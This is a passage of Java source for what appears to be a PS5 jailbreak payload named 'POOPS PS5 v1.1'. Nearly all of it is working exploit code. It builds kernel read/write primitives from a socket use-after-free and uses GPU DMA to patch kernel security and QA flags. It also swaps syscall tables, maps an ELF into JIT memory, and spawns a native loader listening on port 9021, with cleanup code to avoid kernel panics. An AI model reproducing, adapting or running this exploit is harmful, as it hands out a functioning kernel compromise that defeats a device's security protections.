        freeRthdr(ipv6_sockets[triplets[2]]);
        api.call(sys_sched_yield);

        int iovIters = 0;
        while (true) {
            iovState.signalWork(0);
            for (int i = 0; i < 5; i++) api.call(sys_sched_yield);
            
            len_out.putInt(0, 64);
            getRthdr(ipv6_sockets[triplets[0]], rthdr_readback, len_out);
            
            if (rthdr_readback.getInt(32) == 1) break;
            
            api.call(sys_write, iov_sock_b, scratch_big.address(), 8);
            iovState.waitForFinished();
            api.call(sys_read, iov_sock_a, dummy_byte.address(), 8);
            iovIters++;
            if (iovIters > 5000) {
                for (int i = 0; i < 4; i++) api.call(sys_write, uio_sock_b, data.address(), dataSize);
                uioState.waitForFinished();
                return false;
            }
        }

        for (int i = 0; i < 4; i++) api.call(sys_write, uio_sock_b, data.address(), dataSize);

        triplets[1] = findTriplet(triplets[0], -1, MAX_ROUNDS_TRIPLET, rthdr_readback, buildRthdr(rthdr_readback, UCRED_SIZE), dummy_byte, len_out);
        if (triplets[1] == -1) {
            Status.println("[!] kwriteSlow triplet failure 1");
            return false;
        }

        uioState.waitForFinished();
        api.call(sys_write, iov_sock_b, scratch_big.address(), 8);

        triplets[2] = findTriplet(triplets[0], triplets[1], MAX_ROUNDS_TRIPLET, rthdr_readback, buildRthdr(rthdr_readback, UCRED_SIZE), dummy_byte, len_out);
        if (triplets[2] == -1) {
            Status.println("[!] kwriteSlow triplet failure 2");
            return false;
        }
        
        iovState.waitForFinished();
        api.call(sys_read, iov_sock_a, dummy_byte.address(), 8);

        return true;
    }

    // =================================================================
    // --- SHARED UTILITIES ---
    // =================================================================
    public static long findDataBase(long proc) {
        long p = proc;
        for (int i = 0; i < 512; i++) { 
            p = kread64(p + 0x08);
            if (p == 0 || (p >>> 48) != 0xFFFF) break;
            if ((p >>> 32) == 0xFFFFFFFFL) {
                long candidate = p - ALLPROC;
                if ((candidate & 0xFFF) == 0) return candidate;
            }
        }
        return 0;
    }

    private static String readString(Buffer buf, int offset) {
        byte[] bytes = new byte[32];
        int len = 0;
        for (int i = 0; i < 32 && offset + i < buf.size(); i++) {
            byte ch = buf.getByte(offset + i);
            if (ch == 0) break;
            if (ch >= 0x20 && ch <= 0x7E) bytes[len++] = ch;
            else return ""; 
        }
        return new String(bytes, 0, len);
    }

    public static long findNativeProcess() {
        byte[][] targets = {
            "SceSysAv".getBytes(),
            "SceGameLive".getBytes(),
            "SceWebkitProcess".getBytes()
        };
        long p = kread64(dataBase + ALLPROC);
        Buffer pBuf = new Buffer(0x1500); 
        
        while (p != 0 && (p >>> 48) == 0xFFFF) {
            kread(p, pBuf, 0x1500);
            
            for (int i = 0; i < 0x1500 - 32; i++) { 
                for (int t = 0; t < targets.length; t++) {
                    boolean match = true;
                    byte[] target = targets[t];
                    
                    for (int j = 0; j < target.length; j++) {
                        if (pBuf.getByte(i + j) != target[j]) {
                            match = false;
                            break;
                        }
                    }
                    
                    if (match) {
                        Status.println("[+] Target process found.");
                        return p;
                    }
                }
            }
            p = kread64(p);
        }
        return 0;
    }

    public static long[] swapSysent(long sysentOff, long curproc, long targetProc) {
        long our = kread64(curproc + sysentOff);
        long their = kread64(targetProc + sysentOff);
        long svSize = kread32(our);
        long svTable = kread64(our + 0x8);
        kwrite32(our, (int)kread32(their));
        kwrite64(our + 0x8, kread64(their + 0x8));
        return new long[]{our, svSize, svTable};
    }

    public static void restoreSysent(long[] saved) {
        kwrite32(saved[0], (int)saved[1]);
        kwrite64(saved[0] + 0x8, saved[2]);
    }

    // =================================================================
    // --- GPU DMA ENGINE (for Debug Settings) ---
    // =================================================================
    public static class GPU {
        private static final long GPU_PDE_ADDR_MASK = 0x0000FFFFFFFFFFC0L;
        private static final long CPU_PHYS_MASK     = 0x000FFFFFFFFFF000L;
        private static final int PROT_READ = 0x01;
        private static final int PROT_WRITE = 0x02;
        private static final int GPU_READ = 0x10;
        private static final int GPU_WRITE = 0x20;
        private static final int MAP_NO_COALESCE = 0x400000;
        private static final long DMEM_SIZE = 2 * 0x100000L;

        public static long dmapBase, kernelCr3;
        private static int gpuFd = -1;
        
        private static long victimVa, transferVa, cmdVa;
        private static long clearedVictimPtbeForRo, victimPtbeVa;
        
        private static Buffer ioctlDesc = new Buffer(16);
        private static Buffer ioctlSub = new Buffer(16);
        private static Buffer ioctlTs = new Buffer(16);
        private static Buffer devGcPath = new Buffer(8);

        private static long physToDmap(long pa) { return dmapBase + pa; }

        private static long virtToPhys(long va, long cr3) {
            long pml4e = kread64(physToDmap(cr3) + ((va >>> 39) & 0x1FF) * 8);
            if (pml4e == 0 || (pml4e & 1) == 0) return 0;
            long pdpte = kread64(physToDmap(pml4e & CPU_PHYS_MASK) + ((va >>> 30) & 0x1FF) * 8);
            if (pdpte == 0 || (pdpte & 1) == 0) return 0;
            if ((pdpte & 0x80) != 0) return (pdpte & 0x000FFFFFC0000000L) | (va & 0x3FFFFFFFL);
            long pde = kread64(physToDmap(pdpte & CPU_PHYS_MASK) + ((va >>> 21) & 0x1FF) * 8);
            if (pde == 0 || (pde & 1) == 0) return 0;
            if ((pde & 0x80) != 0) return (pde & 0x000FFFFFFFE00000L) | (va & 0x1FFFFFL);
            long pte = kread64(physToDmap(pde & CPU_PHYS_MASK) + ((va >>> 12) & 0x1FF) * 8);
            if (pte == 0 || (pte & 1) == 0) return 0;
            return (pte & CPU_PHYS_MASK) | (va & 0xFFFL);
        }

        private static long getProcCr3(long proc) {
            long vmspace = kread64(proc + PROC_VM_SPACE);
            if (vmspace == 0 || (vmspace >>> 48) != 0xFFFF) return 0;
            for (int i = 1; i <= 6; i++) {
                long val = kread64(vmspace + 0x1C8 + i * 8);
                long diff = val - vmspace;
                if (diff >= 0x2C0 && diff <= 0x2F0) return kread64(val + PMAP_CR3);
            }
            return 0;
        }

        private static long getVmid(long proc) {
            long vmspace = kread64(proc + PROC_VM_SPACE);
            for (int i = 1; i <= 8; i++) {
                int val = kread32(vmspace + 0x1D4 + i * 4);
                if (val > 0 && val <= 0x10) return val;
            }
            return 0;
        }

        private static long gpuPdeField(long pde, int shift) { return (pde >>> shift) & 1; }
        private static long gpuPdeFrag(long pde) { return (pde >>> 59) & 0x1F; }

        private static long[] gpuWalkPt(long vmid, long virtAddr) {
            long gvmspace = dataBase + GVMSPACE + vmid * SIZEOF_GVMSPACE;
            long pdb2Addr = kread64(gvmspace + GVMSPACE_PAGE_DIR);

            long pml4e = kread64(pdb2Addr + ((virtAddr >>> 39) & 0x1FF) * 8);
            if (gpuPdeField(pml4e, 0) != 1) return null;

            long pdpPa = pml4e & GPU_PDE_ADDR_MASK;
            long pdpe = kread64(physToDmap(pdpPa) + ((virtAddr >>> 30) & 0x1FF) * 8);
            if (gpuPdeField(pdpe, 0) != 1) return null;

            long pdPa = pdpe & GPU_PDE_ADDR_MASK;
            long pdeIdx = (virtAddr >>> 21) & 0x1FF;
            long pde = kread64(physToDmap(pdPa) + pdeIdx * 8);
            if (gpuPdeField(pde, 0) != 1) return null;

            if (gpuPdeField(pde, 54) == 1) return new long[]{physToDmap(pdPa) + pdeIdx * 8, 0x200000};

            long frag = gpuPdeFrag(pde);
            long offset = virtAddr & 0x1FFFFF;
            long ptPa = pde & GPU_PDE_ADDR_MASK;
            long pteIdx, pageSize;

            if (frag == 4) {
                pteIdx = offset >>> 16;
                long pte = kread64(physToDmap(ptPa) + pteIdx * 8);
                if (gpuPdeField(pte, 0) == 1 && gpuPdeField(pte, 56) == 1) {
                    pteIdx = (virtAddr & 0xFFFF) >>> 13;
                    pageSize = 0x2000;
                } else { pageSize = 0x10000; }
            } else if (frag == 1) {
                pteIdx = offset >>> 13;
                pageSize = 0x2000;
            } else { return null; }

            return new long[]{physToDmap(ptPa) + pteIdx * 8, pageSize};
        }

        private static long[] getPtbEntry(long proc, long va) {
            long vmid = getVmid(proc);
            if (vmid == 0) return null;
            long gvmspace = dataBase + GVMSPACE + vmid * SIZEOF_GVMSPACE;
            long startVa = kread64(gvmspace + GVMSPACE_START_VA);
            long gvmSize = kread64(gvmspace + GVMSPACE_SIZE);
            if (va < startVa || va >= startVa + gvmSize) return null;
            return gpuWalkPt(vmid, va - startVa);
        }

        private static long[] allocMainDmem(long size, int prot, int flags) {
            Buffer out = new Buffer(8);
            if (api.call(sys_alloc_dmem, size, size, 1, out.address()) != 0) return null;
            long phys = out.getLong(0);
            out.putLong(0, 0);
            if (api.call(sys_map_dmem, out.address(), size, prot, flags, phys, size) != 0) return null;
            return new long[]{out.getLong(0), phys};
        }

        private static long pm4Type3Header(int opcode, int count) {
            return (0x02L | ((long)(opcode & 0xFF) << 8) | (((long)(count - 1) & 0x3FFF) << 16) | (0x03L << 30)) & 0xFFFFFFFFL;
        }

        private static int writePm4DmaTo(long bufVa, long dstVa, long srcVa, long length) {
            long dmaHdr = 0x8C00C000L;
            api.write32(bufVa + 0x00, (int)pm4Type3Header(0x50, 6));
            api.write32(bufVa + 0x04, (int)dmaHdr);
            api.write32(bufVa + 0x08, (int)(srcVa & 0xFFFFFFFFL));
            api.write32(bufVa + 0x0C, (int)((srcVa >>> 32) & 0xFFFFFFFFL));
            api.write32(bufVa + 0x10, (int)(dstVa & 0xFFFFFFFFL));
            api.write32(bufVa + 0x14, (int)((dstVa >>> 32) & 0xFFFFFFFFL));
            api.write32(bufVa + 0x18, (int)(length & 0x1FFFFFL));
            return 28;
        }

        private static boolean submitViaIoctl(long cmdVa, int cmdSize) {
            long dwords = cmdSize >>> 2;
            ioctlDesc.putLong(0, ((cmdVa & 0xFFFFFFFFL) << 32) | 0xC0023F00L);
            ioctlDesc.putLong(8, ((dwords & 0xFFFFFL) << 32) | ((cmdVa >>> 32) & 0xFFFFL));
            ioctlSub.putInt(0, 0);
            ioctlSub.putInt(4, 1);
            ioctlSub.putLong(8, ioctlDesc.address());
            api.call(sys_ioctl, gpuFd, 0xC0108102L, ioctlSub.address());
            ksleep(1);
            return true;
        }

        private static void transferPhys(long physAddr, long size, boolean isWrite) {
            long trunc = physAddr & ~(DMEM_SIZE - 1);
            long offset = physAddr - trunc;
            int protRo = PROT_READ | PROT_WRITE | GPU_READ;
            int protRw = protRo | GPU_WRITE;

            api.call(sys_mprotect, victimVa, DMEM_SIZE, protRo);
            kwrite64(victimPtbeVa, clearedVictimPtbeForRo | trunc);
            api.call(sys_mprotect, victimVa, DMEM_SIZE, protRw);

            long src = isWrite ? transferVa : (victimVa + offset);
            long dst = isWrite ? (victimVa + offset) : transferVa;
            submitViaIoctl(cmdVa, writePm4DmaTo(cmdVa, dst, src, size));
        }

        public static int read32(long kaddr) {
            long pa = virtToPhys(kaddr, kernelCr3);
            if (pa == 0) return 0;
            transferPhys(pa, 4, false);
            return api.read32(transferVa);
        }

        public static void write32(long kaddr, int val) {
            long pa = virtToPhys(kaddr, kernelCr3);
            if (pa == 0) return;
            api.write32(transferVa, val);
            transferPhys(pa, 4, true);
        }

        public static void write8(long kaddr, byte val) {
            long aligned = kaddr & 0xFFFFFFFFFFFFFFFCL;
            long byteoff = kaddr - aligned;
            int dw = read32(aligned);
            dw = (dw & ~(0xFF << (byteoff * 8))) | ((val & 0xFF) << (byteoff * 8));
            write32(aligned, dw);
        }

        public static boolean setup(long curproc) {
            devGcPath.put(0, "/dev/gc\0".getBytes());
            gpuFd = (int) api.call(sys_open, devGcPath.address(), 2, 0); // O_RDWR = 2
            if (gpuFd < 0) return false;

            ioctlTs.putLong(0, 0); ioctlTs.putLong(8, 10000L); // 10us timeout

            long pmapStore = dataBase + KERNEL_PMAP_STORE;
            long pmPml4 = kread64(pmapStore + PMAP_PML4);
            long pmCr3 = kread64(pmapStore + PMAP_CR3);
            dmapBase = pmPml4 - pmCr3;
            kernelCr3 = pmCr3;

            int protRw = PROT_READ | PROT_WRITE | GPU_READ | GPU_WRITE;
            long[] v = allocMainDmem(DMEM_SIZE, protRw, MAP_NO_COALESCE);
            long[] t = allocMainDmem(DMEM_SIZE, protRw, MAP_NO_COALESCE);
            long[] c = allocMainDmem(DMEM_SIZE, protRw, MAP_NO_COALESCE);
            if (v == null || t == null || c == null) return false;
            
            victimVa = v[0]; transferVa = t[0]; cmdVa = c[0];

            long procCr3 = getProcCr3(curproc);
            long victimRealPa = virtToPhys(victimVa, procCr3);
            long[] ptb = getPtbEntry(curproc, victimVa);
            if (ptb == null || ptb[1] != DMEM_SIZE) return false;

            victimPtbeVa = ptb[0];
            api.call(sys_mprotect, victimVa, DMEM_SIZE, PROT_READ | PROT_WRITE | GPU_READ);
            long initialPtbe = kread64(victimPtbeVa);
            clearedVictimPtbeForRo = initialPtbe & (~victimRealPa);
            api.call(sys_mprotect, victimVa, DMEM_SIZE, protRw);

            return true;
        }

        public static void patchDebug() {
            long secFlagsAddr = dataBase + SECURITY_FLAGS;
            Status.println(" |-> Patching Security Flags...");
            int sf = read32(secFlagsAddr);
            write32(secFlagsAddr, sf | 0x14);

            Status.println(" |-> Patching Target ID...");
            write8(secFlagsAddr + 0x09, (byte) 0x82); 

            Status.println(" |-> Patching QA Flags...");
            int qa = read32(secFlagsAddr + 0x24);
            write32(secFlagsAddr + 0x24, qa | 0x10300);

            Status.println(" |-> Patching UTOKEN...");
            long utAddr = secFlagsAddr + 0x8C;
            long utAligned = utAddr & 0xFFFFFFFFFFFFFFFCL;
            long utByte = utAddr - utAligned;
            int utDw = read32(utAligned);
            int utVal = (utDw >>> (utByte * 8)) & 0xFF;
            int newDw = (utDw & ~(0xFF << (utByte * 8))) | (((utVal | 0x01) & 0xFF) << (utByte * 8));
            write32(utAligned, newDw);
        }
    }

    // =================================================================
    // --- ELF LOADER ENGINE ---
    // =================================================================

    public static class ElfLoader {
        private static final long MAPPING_ADDR = 0x926100000L;
        private static final long SHADOW_MAPPING_ADDR = 0x920100000L;

        private static Buffer rwpipe;
        private static Buffer rwpair;
        private static Buffer payloadout;
        private static Buffer args;
        private static Buffer th;
        private static Buffer at;
        private static Buffer threadName;

        public static Buffer loadElfFromJar(String resourcePath) {
            try {
                java.io.InputStream is = Poops.class.getResourceAsStream(resourcePath);
                if (is == null) return null;
                java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                byte[] tempBuf = new byte[8192];
                int read;
                while ((read = is.read(tempBuf)) != -1) baos.write(tempBuf, 0, read);
                byte[] elfBytes = baos.toByteArray();
                Buffer store = new Buffer(elfBytes.length);
                store.put(0, elfBytes);
                if (store.getInt(0) != 0x464C457F) return null; 
                return store;
            } catch (Exception e) {
                Status.println("[!] Error reading ELF from JAR.");
                return null;
            }
        }

        public static long mapElf(Buffer store, long sysentOff, long curproc, long targetProc) {
            long e_entry = store.getLong(0x18);
            long e_phoff = store.getLong(0x20);
            long e_shoff = store.getLong(0x28);
            int e_phnum = store.getShort(0x38) & 0xFFFF;
            int e_shnum = store.getShort(0x3C) & 0xFFFF;
            long exec_start = 0, exec_end = 0;

            for (int i = 0; i < e_phnum; i++) {
                long ph = store.address() + e_phoff + i * 0x38;
                int p_type = api.read32(ph);
                int p_flags = api.read32(ph + 4);
                long p_off = api.read64(ph + 0x08);
                long p_vaddr = api.read64(ph + 0x10);
                long p_filesz = api.read64(ph + 0x20);
                long p_memsz = api.read64(ph + 0x28);

                if (p_type == 1) { // PT_LOAD
                    long aligned = (p_memsz + 0x3FFF) & 0xFFFFC000L;
                    if ((p_flags & 1) == 1) {
                        exec_start = p_vaddr; exec_end = p_vaddr + p_memsz;
                        
                        long[] s1 = swapSysent(sysentOff, curproc, targetProc);
                        Buffer fdBuf = new Buffer(8);
                        
                        long retCreate = api.call(sys_jitshm_create, 0L, aligned, 7L, fdBuf.address());
                        int eh = fdBuf.getInt(0);
                        
                        long retAlias = api.call(sys_jitshm_alias, eh, 3L, fdBuf.address());
                        int wh = fdBuf.getInt(0);

                        long mmapRes = api.call(sys_mmap, SHADOW_MAPPING_ADDR, aligned, 3L, 0x11L, (long)wh, 0L);
                        restoreSysent(s1);
                        
                        if (retCreate != 0 || retAlias != 0 || eh <= 0 || wh <= 0 || mmapRes < 0) {
                            Status.println("[!] FATAL: JIT alloc fallo. ret=".concat(String.valueOf(retCreate)));
                            return 0; 
                        }
                        
                        if (p_filesz > 0) api.memcpy(SHADOW_MAPPING_ADDR, store.address() + p_off, p_filesz);
                        if (p_memsz > p_filesz) api.memset(SHADOW_MAPPING_ADDR + p_filesz, 0, (int)(p_memsz - p_filesz));
                        
                        long[] s2 = swapSysent(sysentOff, curproc, targetProc);
                        long mmapRes2 = api.call(sys_mmap, MAPPING_ADDR + p_vaddr, aligned, 5L, 0x11L, (long)eh, 0L); // PROT_RX
                        restoreSysent(s2);

                        if (mmapRes2 < 0) {
                            Status.println("[!] FATAL: JIT map fails. mmap2=".concat(String.valueOf(mmapRes2)));
                            return 0;
                        }

                    } else {
                        long mmapRes3 = api.call(sys_mmap, MAPPING_ADDR + p_vaddr, aligned, 3L, 0x1012L, 0xFFFFFFFFL, 0L);
                        if (mmapRes3 < 0) {
                            Status.println("[!] FATAL: Error mapping data mmap3=".concat(String.valueOf(mmapRes3)));
                            return 0;
                        }
                        if (p_filesz > 0) api.memcpy(MAPPING_ADDR + p_vaddr, store.address() + p_off, p_filesz);
                    }
                }
            }

            for (int i = 0; i < e_shnum; i++) {
                long sh = store.address() + e_shoff + i * 0x40;
                if (api.read32(sh + 4) == 4) { // SHT_RELA
                    long sh_off = api.read64(sh + 0x18);
                    long sh_size = api.read64(sh + 0x20);
                    for (int j = 0; j < (sh_size / 0x18); j++) {
                        long r = store.address() + sh_off + j * 0x18;
                        long r_offset = api.read64(r);
                        long r_info = api.read64(r + 8);
                        long r_addend = api.read64(r + 0x10);

                        if ((r_info & 0xFF) == 0x08) {
                            long dst = (r_offset >= exec_start && r_offset < exec_end) 
                                       ? (SHADOW_MAPPING_ADDR + r_offset) 
                                       : (MAPPING_ADDR + r_offset);
                            api.write64(dst, MAPPING_ADDR + r_addend);
                        }
                    }
                }
            }
            return MAPPING_ADDR + e_entry;
        }

        public static long[] createElfPipes(long fdOfiles) {
            Int32Array pipeFd = new Int32Array(2);
            if (api.call(sys_pipe, pipeFd.address()) != 0) return null;
            int rfd = pipeFd.get(0); int wfd = pipeFd.get(1);

            long prfp = 0;
            for (int i = 0; i < 100; i++) {
                prfp = kread64(fdOfiles + rfd * FILEDESCENT_SIZE);
                if (prfp != 0) break;
                api.call(sys_sched_yield);
            }
            if (prfp == 0) return null;

            long kpipe = kread64(prfp);
            if (kpipe == 0) return null;
            
            long pwfp = 0;
            for (int i = 0; i < 100; i++) {
                pwfp = kread64(fdOfiles + wfd * FILEDESCENT_SIZE);
                if (pwfp != 0) break;
                api.call(sys_sched_yield);
            }
            if (pwfp == 0) return null;

            kwrite32(prfp + 0x28, kread32(prfp + 0x28) + 0x100);
            kwrite32(pwfp + 0x28, kread32(pwfp + 0x28) + 0x100);
            return new long[]{rfd, wfd, kpipe};
        }

        public static long[] createOverlappedSockets(long fdOfiles) {
            int ms = (int) api.call(sys_socket, AF_INET6, 2, 17); // DGRAM, UDP
            int vs = (int) api.call(sys_socket, AF_INET6, 2, 17);
            if (ms < 0 || vs < 0) return null;

            Buffer mbuf = new Buffer(20); mbuf.fill((byte)0);
            api.call(sys_setsockopt, ms, IPPROTO_IPV6, 46, mbuf.address(), 20L); // PKTINFO
            Buffer vbuf = new Buffer(20); vbuf.fill((byte)0);
            api.call(sys_setsockopt, vs, IPPROTO_IPV6, 46, vbuf.address(), 20L);

            long mfp = 0;
            long vfp = 0;

            for (int i = 0; i < 100; i++) {
                if (mfp == 0) mfp = kread64(fdOfiles + ms * FILEDESCENT_SIZE);
                if (vfp == 0) vfp = kread64(fdOfiles + vs * FILEDESCENT_SIZE);
                if (mfp != 0 && vfp != 0) break;
                api.call(sys_sched_yield);
            }

            if (mfp == 0 || vfp == 0) return null;

            long mso = kread64(mfp); long vso = kread64(vfp);
            long mpcb = kread64(mso + 0x18); long mp = kread64(mpcb + INPCB_PKTOPTS);
            long vpcb = kread64(vso + 0x18); long vp = kread64(vpcb + INPCB_PKTOPTS);

            if (mp == 0 || vp == 0) return null;

            kwrite32(mfp + 0x28, kread32(mfp + 0x28) + 0x100);
            kwrite32(vfp + 0x28, kread32(vfp + 0x28) + 0x100);
            kwrite64(mp + 0x10, vp + 0x10);

            return new long[]{ms, vs};
        }

        public static void load(long curproc, long fdOfiles, long sysentOff, long targetProc, String fw) {
            String elfResource = "/elfldr_1001.elf";
            try {
                float fwNum = Float.parseFloat(fw);
                if (fwNum > 10.01f) {
                    elfResource = "/elfldr_1200.elf";
                }
            } catch (Exception e) {
                Status.println(" |-> FW parse error, defaulting to 1001.elf");
            }

            Status.println("[*] Loading ELF (".concat(elfResource).concat(") from JAR..."));
            Buffer store = loadElfFromJar(elfResource);
            if (store == null) {
                Status.println("[!] ELF Loader: '".concat(elfResource).concat("' not found in JAR."));
                return;
            }

            long[] pipeData = createElfPipes(fdOfiles);
            long[] socketData = createOverlappedSockets(fdOfiles);
            if (pipeData == null || socketData == null) {
                Status.println("[!] Failed to setup ELF environment.");
                return;
            }

            rwpipe = new Buffer(8); rwpipe.putInt(0, (int)pipeData[0]); rwpipe.putInt(4, (int)pipeData[1]);
            rwpair = new Buffer(8); rwpair.putInt(0, (int)socketData[0]); rwpair.putInt(4, (int)socketData[1]);
            payloadout = new Buffer(4); payloadout.putInt(0, 0);

            args = new Buffer(0x30);
            args.putLong(0x00, sys_getpid); 
            args.putLong(0x08, rwpipe.address());
            args.putLong(0x10, rwpair.address());
            args.putLong(0x18, pipeData[2]); 
            args.putLong(0x20, dataBase);
            args.putLong(0x28, payloadout.address());

            th = new Buffer(8);
            at = new Buffer(0x100);
            api.call(api.dlsym(libkernel, "scePthreadAttrInit"), at.address());
            api.call(api.dlsym(libkernel, "scePthreadAttrSetstacksize"), at.address(), 0x80000L);
            long scePthreadAttrSetdetachstate = api.dlsym(libkernel, "scePthreadAttrSetdetachstate");
            if (scePthreadAttrSetdetachstate != 0) {
                api.call(scePthreadAttrSetdetachstate, at.address(), 1L); 
            }
            threadName = new Buffer(8); threadName.put(0, "elfldr\0".getBytes());

            Status.println("[*] Mapping ELF into JIT memory...");
            long entry = mapElf(store, sysentOff, curproc, targetProc);
            
            if (entry == 0) {
                 Status.println("[!] Aborting ELF inyection memory Error.");
                 return;
            }
            
            Status.println("[*] Launching native thread...");
            long ret = api.call(sys_scePthreadCreate, th.address(), at.address(), entry, args.address(), threadName.address());

            api.call(api.dlsym(libkernel, "scePthreadAttrDestroy"), at.address());
            if (ret == 0) {
                Status.println("[+] Thread spawned. Waiting for bootstrap to complete...");
                ksleep(4000);
                Status.println("[+] ELF Loader ready! Port 9021 Open.");
            } else {
                Status.println("[!] scePthreadCreate failed: ".concat(String.valueOf(ret)));
            }
        }
    }

    // --- FAST KERNEL PRIMITIVES ---
    private static Buffer pipeCmdBuf = new Buffer(24);
    
    public static void setVictimPipe(int cnt, int inp, int out, int size, long bufAddr) {
        pipeCmdBuf.putInt(0, cnt);
        pipeCmdBuf.putInt(4, inp);
        pipeCmdBuf.putInt(8, out);
        pipeCmdBuf.putInt(12, size);
        pipeCmdBuf.putLong(16, bufAddr);
        api.call(sys_write, masterWfd, pipeCmdBuf.address(), 24L);
        api.call(sys_read, masterRfd, pipeCmdBuf.address(), 24L);
    }

    public static void kread(long kaddr, Buffer dest, int size) {
        setVictimPipe(size, 0, 0, 0x4000, kaddr);
        api.call(sys_read, victimRfd, dest.address(), (long)size);
    }

    public static void kwrite(long kaddr, Buffer src, int size) {
        setVictimPipe(0, 0, 0, 0x4000, kaddr);
        api.call(sys_write, victimWfd, src.address(), (long)size);
    }

    // --- FAST R/W WRAPPERS ---
    private static Buffer rwBuf8 = new Buffer(8);
    private static Buffer rwBuf4 = new Buffer(4);

    public static long kread64(long kaddr) {
        kread(kaddr, rwBuf8, 8);
        return rwBuf8.getLong(0);
    }
    public static int kread32(long kaddr) {
        kread(kaddr, rwBuf4, 4);
        return rwBuf4.getInt(0);
    }
    public static void kwrite64(long kaddr, long val) {
        rwBuf8.putLong(0, val);
        kwrite(kaddr, rwBuf8, 8);
    }
    public static void kwrite32(long kaddr, int val) {
        rwBuf4.putInt(0, val);
        kwrite(kaddr, rwBuf4, 4);
    }

    // ==========================================
    // STAGE 3b: CLEANUP (Kernel Panic Prevention)
    // ==========================================

    private static void removeRthrFromSocket(int fd, long fdOfiles) {
        long fp = kread64(fdOfiles + fd * FILEDESCENT_SIZE);
        if (fp == 0 || (fp >>> 48) != 0xFFFF) return;
        
        long fData = kread64(fp + 0x00);
        if (fData == 0 || (fData >>> 48) != 0xFFFF) return;
        
        long soPcb = kread64(fData + 0x18);
        if (soPcb == 0 || (soPcb >>> 48) != 0xFFFF) return;
        
        long pktopts = kread64(soPcb + 0x120);
        if (pktopts != 0 && (pktopts >>> 48) == 0xFFFF) {
            kwrite64(pktopts + 0x70, 0); 
        }
    }

    public static void cleanupExploit(long fdOfiles) {
        Status.println("[*] Executing deep kernel cleanup...");
        
        for (int i = 0; i < ipv6_count; i++) {
            removeRthrFromSocket(ipv6_sockets[i], fdOfiles);
        }

        int[] criticalFds = {masterRfd, masterWfd, victimRfd, victimWfd};
        for (int i = 0; i < criticalFds.length; i++) {
            int fd = criticalFds[i];
            long fp = kread64(fdOfiles + fd * FILEDESCENT_SIZE);
            if (fp != 0 && (fp >>> 48) == 0xFFFF) {
                int rc = kread32(fp + 0x28);
                if (rc > 0 && rc < 0x10000) {
                    kwrite32(fp + 0x28, rc + 0x100);
                }
            }
        }

        if (uafSocket >= 0) {
            long uafFp = kread64(fdOfiles + uafSocket * FILEDESCENT_SIZE);
            kwrite64(fdOfiles + uafSocket * FILEDESCENT_SIZE, 0);

            int removed = 0;
            for (int i = 0; i < 4096; i++) {
                int tempSock = (int) api.call(sys_socket, 1, 1, 0); 
                long tempFp = kread64(fdOfiles + tempSock * FILEDESCENT_SIZE);
                
                if (tempFp == uafFp && tempFp != 0) {
                    kwrite64(fdOfiles + tempSock * FILEDESCENT_SIZE, 0);
                    removed++;
                }
                api.call(sys_close, tempSock);
                if (removed == 3) { 
                    break;
                }
            }
            if (removed > 0) Status.println(" |-> Purged ".concat(String.valueOf(removed)).concat(" phantom files from kernel freelist."));
        }

        for (int i = 0; i < ipv6_count; i++) {
            api.call(sys_close, ipv6_sockets[i]);
        }
        api.call(sys_close, uio_sock_a);
        api.call(sys_close, uio_sock_b);
        api.call(sys_close, iov_sock_a);
        api.call(sys_close, iov_sock_b);

        Status.println("[+] Kernel is now stable.");
    }

    public static String getRealFirmware() {
        if (sys_sysctlbyname == 0) return null;
        
        try {
            Buffer nameBuf = new Buffer(32);
            nameBuf.put(0, "kern.sdk_version\0".getBytes());
            
            Buffer outBuf = new Buffer(8);
            Buffer sizeBuf = new Buffer(8);
            sizeBuf.putLong(0, 8);

            long ret = api.call(sys_sysctlbyname, nameBuf.address(), outBuf.address(), sizeBuf.address(), 0L, 0L);

            if (ret == 0) {
                int minor = outBuf.getByte(2) & 0xFF; 
                int major = outBuf.getByte(3) & 0xFF; 
                
                String majorStr = Integer.toHexString(major);
                String minorStr = Integer.toHexString(minor);
                if (minorStr.length() == 1) minorStr = "0".concat(minorStr); 
                
                return majorStr.concat(".").concat(minorStr);
            }
        } catch (Exception e) {}
        
        return null;
    }

    public static boolean canConnect(String host, int port, int timeoutMs) {
        Socket socket = null;
        try {
            socket = new Socket();
            socket.connect(new InetSocketAddress(host, port), timeoutMs);
            return true;
        } catch (IOException e) {
            return false;
        } finally {
            if (socket != null) {
                try {
                    socket.close();
                } catch (IOException e) {}
            }
        }
    }

    public static boolean isJailbroken() {
        return canConnect("127.0.0.1", 9021, 500);
    }

    public static boolean sendElf(String elfPath) {
        InputStream elfInput = null;
        Socket elfldrSocket = null;
        OutputStream socketOutput = null;

        try {
            elfInput = Poops.class.getResourceAsStream(elfPath);
            if (elfInput == null) {
                Status.println("[!] ps5_autoload.elf not found in payload.jar.");
                return false;
            }

            Status.println("[*] Sending ps5_autoload.elf to 127.0.0.1:9021...");
            elfldrSocket = new Socket();
            elfldrSocket.connect(new InetSocketAddress("127.0.0.1", 9021), 500);
            socketOutput = elfldrSocket.getOutputStream();

            byte[] buffer = new byte[4096];
            int bytesRead = 0;
            while ((bytesRead = elfInput.read(buffer)) != -1) {
                socketOutput.write(buffer, 0, bytesRead);
            }
            socketOutput.flush();
            Status.println("[+] ps5_autoload.elf sent to 127.0.0.1:9021.");
            return true;
        } catch (IOException e) {
            Status.printStackTrace("[!] Failed to send ps5_autoload.elf", e);
            return false;
        } finally {
            if (socketOutput != null) {
                try {
                    socketOutput.close();
                } catch (IOException e) {}
            }
            if (elfldrSocket != null) {
                try {
                    elfldrSocket.close();
                } catch (IOException e) {}
            }
            if (elfInput != null) {
                try {
                    elfInput.close();
                } catch (IOException e) {}
            }
        }
    }

// --- ENTRY POINT ---
    public static void main(String[] args) {

        Status.println("=========================================");
        Status.println("[*] POOPS PS5 v1.1 PAYLOAD STARTED");
        Status.println("=========================================");

        long sysentOff = 0xa00;

        try {
            api = API.getInstance();
            if (!resolveSyscalls()) {
                Status.println("[!] ERROR: Unresolved Syscalls. Aborting.");
                return;
            }

            if (isJailbroken()) {
                NativeInvoke.sendNotificationRequest("Already jailbroken");
                Status.println("[+] Already jailbroken. Skipping Poops exploit.");
                Status.println("[+] Closing disc player in 1 second...");
                try { Thread.sleep(1000); } catch (Exception e) {}
                sendElf("/ps5_killdiscplayer.elf");
                return;
            }

            String realFw = getRealFirmware();

            if (realFw == null) {
                Status.println("[!] FATAL ERROR: Could not detect firmware via sysctlbyname.");
                Status.println("[!] Aborting exploit to prevent Kernel Panic.");
                return;
            }

            Status.println("[i] PS5 FW: ".concat(realFw));

            if (!initOffsets(realFw)) {
                return; 
